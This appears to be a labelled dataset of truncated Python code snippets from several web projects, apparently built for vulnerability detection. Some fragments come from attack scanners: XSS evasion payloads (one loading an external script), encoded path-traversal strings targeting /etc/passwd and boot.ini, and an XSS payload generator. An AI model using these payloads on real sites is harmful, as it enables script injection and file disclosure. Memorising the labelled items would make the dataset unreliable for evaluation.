'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 5347, "code": " 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template'", "label": 0}, {"snippet_id": 13130, "code": " name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account',", "label": 0}, {"snippet_id": 13898, "code": ".views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 16101, "code": "), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views", "label": 0}, {"snippet_id": 51496, "code": " +=['django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware", "label": 0}, {"snippet_id": 9010, "code": "', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 47823, "code": "\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName", "label": 1}, {"snippet_id": 8938, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 6849, "code": ", in minutes, a user has to complete the login phase. After this time, login cannot complete because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self", "label": 0}, {"snippet_id": 48539, "code": " required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect", "label": 0}, {"snippet_id": 15794, "code": "] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets", "label": 0}, {"snippet_id": 12779, "code": "]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register", "label": 0}, {"snippet_id": 34674, "code": "\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint", "label": 0}, {"snippet_id": 37419, "code": ".comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", ", "label": 0}, {"snippet_id": 22863, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 37289, "code": " and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name", "label": 0}, {"snippet_id": 45143, "code": ".objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception,", "label": 0}, {"snippet_id": 46413, "code": "'name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description", "label": 0}, {"snippet_id": 18583, "code": "]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r", "label": 0}, {"snippet_id": 10368, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that", "label": 0}, {"snippet_id": 51589, "code": " \"sql_mode='STRICT_ALL_TABLES';\"}, } DB_ENGINE=os.environ.get('DB_ENGINE', 'mysql') DATABASE_ENGINES={ 'mysql': 'dashboard.app.backends.mysql', } DATABASES_SETTINGS={ 'dev':{ 'ENGINE': 'django.db.backends", "label": 0}, {"snippet_id": 19755, "code": " -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks", "label": 0}, {"snippet_id": 50170, "code": ", data): \"\"\" This adds the data to the buffer and/or sends it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request=self.requests", "label": 0}, {"snippet_id": 43354, "code": " frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"", "label": 0}, {"snippet_id": 50876, "code": "): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for", "label": 0}, {"snippet_id": 32155, "code": "'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables", "label": 1}, {"snippet_id": 42065, "code": "\t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict", "label": 0}, {"snippet_id": 6859, "code": " the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): \"\"\" Add", "label": 0}, {"snippet_id": 35410, "code": ".meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty", "label": 0}, {"snippet_id": 34797, "code": " self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\",", "label": 0}, {"snippet_id": 20992, "code": "), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template", "label": 0}, {"snippet_id": 38265, "code": "('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append(", "label": 0}, {"snippet_id": 44037, "code": " SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using", "label": 1}, {"snippet_id": 48430, "code": "(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"", "label": 1}, {"snippet_id": 39623, "code": "\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html", "label": 0}, {"snippet_id": 28327, "code": "'/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir", "label": 0}, {"snippet_id": 2315, "code": ".logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid,", "label": 0}, {"snippet_id": 36315, "code": ".print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide ", "label": 0}, {"snippet_id": 38105, "code": "\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local", "label": 0}, {"snippet_id": 20919, "code": " urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 48985, "code": "<td>{}</td>', self.format(self.get_value()) ) def render_link(self): if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url(", "label": 0}, {"snippet_id": 39537, "code": "\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname", "label": 0}, {"snippet_id": 53362, "code": "', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json", "label": 1}, {"snippet_id": 47992, "code": "=64 def action_change_user_avatar(request: HttpRequest): try: user_id=int(request.GET[\"payload\"]) media_id=int(request.GET[\"media_id\"]) user: Profile=Profile.objects.get(pk=int(user_id)) u: Profile=get_current_user", "label": 0}, {"snippet_id": 50683, "code": ".client.client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession: csession[\"webclient_authenticated_uid\"]=self.uid csession", "label": 0}, {"snippet_id": 36426, "code": " \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get", "label": 0}, {"snippet_id": 11025, "code": " self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\")", "label": 0}, {"snippet_id": 53474, "code": "'coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc", "label": 0}, {"snippet_id": 41838, "code": " filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self", "label": 0}, {"snippet_id": 22403, "code": "'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 17399, "code": "-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter", "label": 0}, {"snippet_id": 14635, "code": ".shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd", "label": 0}, {"snippet_id": 23941, "code": "._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string", "label": 0}, {"snippet_id": 4358, "code": ".url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' %", "label": 1}, {"snippet_id": 50092, "code": " pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems", "label": 0}, {"snippet_id": 52408, "code": ".update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status", "label": 0}, {"snippet_id": 40854, "code": ", \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t", "label": 0}, {"snippet_id": 44500, "code": "'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs", "label": 0}, {"snippet_id": 42800, "code": "\t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields", "label": 0}, {"snippet_id": 27513, "code": "\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token", "label": 0}, {"snippet_id": 40406, "code": " raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception", "label": 0}, {"snippet_id": 53899, "code": "]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST", "label": 1}, {"snippet_id": 1944, "code": ".insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{", "label": 0}, {"snippet_id": 36350, "code": " format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self", "label": 0}, {"snippet_id": 40412, "code": ".is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t", "label": 0}, {"snippet_id": 2538, "code": "=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\":", "label": 1}, {"snippet_id": 48491, "code": " request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and", "label": 0}, {"snippet_id": 24364, "code": " platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the", "label": 0}, {"snippet_id": 34417, "code": "\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value", "label": 0}, {"snippet_id": 4955, "code": "=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=/", "label": 0}, {"snippet_id": 35624, "code": ", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe", "label": 0}, {"snippet_id": 37582, "code": " exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db", "label": 0}, {"snippet_id": 38608, "code": "] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d):", "label": 0}, {"snippet_id": 48860, "code": ".title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value[0]", "label": 0}, {"snippet_id": 50153, "code": " self.keep_alive=None def at_login(self): \"\"\" Called when this session gets authenticated by the server. \"\"\" pass def lineSend(self, csessid, data): \"\"\" This adds the data to the buffer and/or sends it", "label": 0}, {"snippet_id": 24748, "code": "\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir", "label": 0}, {"snippet_id": 27405, "code": ", cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt", "label": 0}, {"snippet_id": 27811, "code": " >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', '", "label": 0}, {"snippet_id": 31529, "code": "\tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={}", "label": 0}, {"snippet_id": 53689, "code": "\nimport os import argparse from jinja2 import Environment, FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment", "label": 1}, {"snippet_id": 17246, "code": "/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include", "label": 0}, {"snippet_id": 53040, "code": " edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get", "label": 0}, {"snippet_id": 37356, "code": "=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context", "label": 0}, {"snippet_id": 8210, "code": ", ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course", "label": 0}, {"snippet_id": 29520, "code": "\t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")", "label": 0}, {"snippet_id": 21348, "code": "]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 52651, "code": "=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request", "label": 0}, {"snippet_id": 50775, "code": " text=args[0] if text is None: return else: return flags=self.protocol_flags text=utils.to_str(text, force_string=True) options=kwargs.pop(\"options\",{}) raw=options.get(\"raw\", flags.get(\"RAW\", False)) xterm256", "label": 0}, {"snippet_id": 19982, "code": ".prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo')", "label": 0}, {"snippet_id": 31600, "code": "][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\")", "label": 0}, {"snippet_id": 44274, "code": ": json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id", "label": 1}, {"snippet_id": 52307, "code": " workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse", "label": 0}, {"snippet_id": 34461, "code": ": \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t", "label": 0}, {"snippet_id": 20112, "code": "(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{", "label": 0}, {"snippet_id": 38863, "code": "\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value", "label": 0}, {"snippet_id": 50400, "code": ", cmdarray[2]]}) return '\"\"' def mode_receive(self, request): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis", "label": 0}, {"snippet_id": 53575, "code": ", request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application", "label": 0}, {"snippet_id": 19636, "code": ".start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file", "label": 0}, {"snippet_id": 44525, "code": " HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', ", "label": 0}, {"snippet_id": 4697, "code": "'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', ", "label": 0}, {"snippet_id": 52606, "code": " script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16", "label": 0}, {"snippet_id": 51351, "code": "'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=('name', 'account', 'urls') @admin.register(UploadLog) class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin)", "label": 0}, {"snippet_id": 52637, "code": "(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception", "label": 0}, {"snippet_id": 12375, "code": " name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',", "label": 0}, {"snippet_id": 43042, "code": " options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")", "label": 0}, {"snippet_id": 8452, "code": " django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 41353, "code": "}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger", "label": 0}, {"snippet_id": 26679, "code": "../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 33068, "code": "=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents' contents.tail='\\n' toc_aux=ElementTree.SubElement", "label": 0}, {"snippet_id": 45237, "code": " }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get", "label": 0}, {"snippet_id": 1602, "code": ") try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return", "label": 0}, {"snippet_id": 17636, "code": "', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 11729, "code": ", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 4493, "code": " @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace", "label": 0}, {"snippet_id": 22789, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', ", "label": 1}, {"snippet_id": 3804, "code": " \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text}", "label": 0}, {"snippet_id": 6492, "code": " without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. ", "label": 0}, {"snippet_id": 22502, "code": "'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}),", "label": 0}, {"snippet_id": 26627, "code": "%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', 